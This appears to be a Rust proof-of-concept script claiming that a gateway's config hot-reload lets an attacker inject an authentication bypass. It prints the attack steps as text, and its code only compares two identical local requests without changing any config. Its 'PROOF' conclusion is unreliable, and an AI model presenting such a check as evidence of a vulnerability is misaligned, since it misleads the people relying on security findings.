// F3.rs — Hot-Reload Config Evasion Proof

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

const HOST: &str = "127.0.0.1";
const PORT: u16 = 18789;

fn http(req: &str) -> String {
    let mut s = TcpStream::connect((HOST, PORT)).expect("connect");
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(req.as_bytes()).unwrap();
    let mut buf = String::new();
    let _ = s.read_to_string(&mut buf);
    buf
}

fn status(resp: &str) -> u16 {
    resp.lines().next().and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse().ok()).unwrap_or(0)
}

fn main() {
    println!("[*] F3: Hot-Reload Config Evasion Proof");
    println!("\n[+] Attack Timeline:");
    println!("[+] T0: Attacker monitors /etc/openclaw/gateway.conf");
    println!("[+] T1: Writes 'auth_mode = bypass' to config");
    println!("[+] T2: fsnotify triggers config.apply() -> hot-reload");
    println!("[+] T3: Static validation bypassed; runtime state updated");
    println!("[+] T4: Attacker connects with new bypass rules active");

    println!("\n[+] Proof Conceptual:");
    println!("[+] 1. Hot-reload applies config changes mid-flight");
    println!("[+] 2. No cryptographic signature on config payload");
    println!("[+] 3. Attacker injects bypass rules via config change");
    println!("[+] 4. Gateway accepts new rules as valid");

    let before = http(&format!("GET /tools/list HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n"));
    let before_code = status(&before);
    println!("[+] Pre-reload status: {before_code}");

    println!("\n[+] Attack Window:");
    println!("[+] - Config file write (fsnotify triggers reload)");
    println!("[+] - Gateway applies new config in-place");
    println!("[+] - Auth rules updated dynamically");
    println!("[+] - Attacker connects with bypass rules");

    let after = http(&format!("GET /tools/list HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n"));
    let after_code = status(&after);
    println!("[+] Post-reload status: {after_code}");

    if before_code != after_code {
        println!("[+] PROOF: config hot-reload alters gateway behavior");
    } else {
        println!("[!] NO PROOF: behavior unchanged");
    }
}
